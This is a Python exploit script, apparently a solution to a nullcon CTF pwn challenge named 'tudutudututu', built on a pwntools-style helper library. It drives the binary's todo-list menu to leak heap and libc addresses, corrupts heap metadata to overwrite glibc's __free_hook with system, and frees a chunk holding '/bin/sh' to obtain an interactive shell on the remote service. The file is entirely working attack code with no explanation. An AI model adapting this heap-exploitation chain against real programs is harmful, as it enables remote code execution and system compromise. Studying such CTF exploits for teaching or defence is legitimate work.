#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import re

bin_file = './tudutudututu'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.ctf.nullcon.net', 'port':4003})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    todo = Todo(conn)

    todo.create('a'*7)
    todo.set('a'*7, 0x68-1, '1'*7)
    todo.create('b'*7)
    todo.set('b'*7, 0x88-1, '2'*7)
    todo.create('c'*7)
    todo.set('c'*7, 0x68-1, '3'*7)
    todo.create('d'*7)
    todo.create('e'*7)

    todo.delete('c'*7)
    todo.create('C'*7)
    todo.delete('a'*7)
    todo.create('A'*7)
    todo.delete('b'*7)
    todo.create('B'*7)

    leak = todo.get()
    addr_heap_base = u(leak['A'*7]) - 0x11d0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena = u(leak['B'*7]) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    todo.set('d'*7, 0x88-1, '4'*0x18+p64(0)+p64(addr_libc_free_hook-0x10))
    todo.delete('d'*7)
    todo.delete('e'*7)

    todo.set('C'*7, 0x18-1, '5'*7)
    todo.set('C'*7, 0x68-1, p64(addr_heap_base + 0x1120))

    todo.create('x'*0x18+p64(0x71))
    todo.set('x'*0x18+p64(0x71), 0x68-1, '/bin/sh\n')

    todo.create('y'*0x60)
    todo.set('y'*0x60, 0x68-1, p(-1)+p(0x31)+p(-1)+p64((addr_libc_free_hook-0xd) - 0x10)+'Y'*0x18+p64(0x21))

    todo.create('z'*0x20)
    todo.set('z'*0x20, 0x68-1, p64(addr_libc_system))
    todo.delete('A'*0x7)
    
class Todo:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.unrecv         = conn.unrecv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create(self, topic):
        self.sendlineafter('> ', '1')
        self.sendlineafter('topic: ', topic)

    def set(self, topic, length, desc):
        self.sendlineafter('> ', '2')
        self.sendlineafter('topic: ', topic)
        x = self.sendlineafter if length < 100 else self.sendafter
        x('length: ', str(length))
        self.sendlineafter('Desc: ', desc)

    def delete(self, topic):
        self.sendlineafter('> ', '3')
        self.sendlineafter('topic: ', topic)

    def get(self):
        self.sendlineafter('> ', '4')
        todos = dict(re.findall(r'(.*) - (.*)', self.recvuntil('\n> ')))
        self.unrecv('> ')
        return todos

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
